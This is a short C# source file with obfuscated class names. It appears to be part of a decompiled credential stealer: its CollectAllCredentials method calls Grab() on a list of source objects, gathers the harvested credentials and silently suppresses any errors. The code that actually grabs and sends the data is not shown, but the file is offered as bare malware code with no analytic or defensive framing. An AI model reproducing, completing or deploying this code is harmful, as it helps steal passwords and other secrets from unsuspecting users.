using System;
using System.Collections.Generic;

namespace C6Zy
{
	public class SetupDataLists
	{
		public List<EtbH> CredentialsList { get; private set; }
		public List<WTitxI2m> CredentialsList_ { get; set; }

		public SetupDataLists()
		{
			this.CredentialsList = new List<EtbH>();
			this.CredentialsList_ = new List<WTitxI2m>();
		}

		public void AppendToCredentialList(EtbH oXA)
		{
			this.CredentialsList.Add(oXA);
		}

		public void _AppendToCredentialList(string name)
		{
			AppendToCredentialList(new EtbH(name));
		}

		public void CollectAllCredentials()
		{
			try
			{
				foreach (EtbH etbH in this.CredentialsList)
				{
					try
					{
						this.CredentialsList_.AddRange(etbH.Grab());
						GC.Collect();
					}
					catch
					{
					}
				}
			}
			finally
			{
				this.CredentialsList.Clear();
			}
		}
	}
}
